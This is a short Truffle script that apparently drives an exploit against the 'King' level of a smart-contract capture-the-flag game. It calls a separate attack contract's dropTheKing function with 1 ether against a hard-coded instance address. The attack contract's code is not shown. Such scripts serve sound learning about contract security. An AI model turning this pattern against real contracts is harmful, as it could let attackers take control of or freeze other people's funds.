const King = artifacts.require("King");
const KingAttack = artifacts.require("KingAttack");

// change these constants according to your needs
const KingInstanceAddress = "0x0cc1b6050f5962e31ce363d9b147ee410c5372d2";
const KingAttackInstanceAddress = "0x531af3c06fecd43630c281842546c694261fade9";

async function execute(callback){
  console.log("Start exploit...");
  let kingInstance = King.at(KingInstanceAddress);
  let kingAttackInstance = KingAttack.at(KingAttackInstanceAddress);

  await kingAttackInstance.dropTheKing(KingInstanceAddress, {value: web3.toWei('1','ether')});
  let king = await kingInstance.king.call();
  console.log("Current king is",king);

  callback();
}

module.exports = execute;
